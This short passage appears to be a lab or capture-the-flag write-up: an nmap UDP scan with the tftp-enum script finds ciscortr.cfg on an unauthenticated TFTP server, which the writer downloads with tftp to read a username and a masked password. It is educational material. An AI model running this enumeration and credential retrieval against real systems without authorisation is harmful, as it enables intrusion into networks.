
```
nmap -sU 10.129.238.52 -p 69 --script=tftp-enum.nse
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 18:36 CDT
Nmap scan report for 10.129.238.52
Host is up (0.015s latency).

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum: 
|_  ciscortr.cfg

Nmap done: 1 IP address (1 host up) scanned in 103.45 seconds
```

By default tftp doesn't require authentication.

Connected to the tftp server and downloaded the ciscortr.cfg file.

```
tftp 10.129.238.52       
tftp> get ciscortr.cfg
tftp>
```

Viewed it on local machine and found credentials.

```
username ike password *****
```
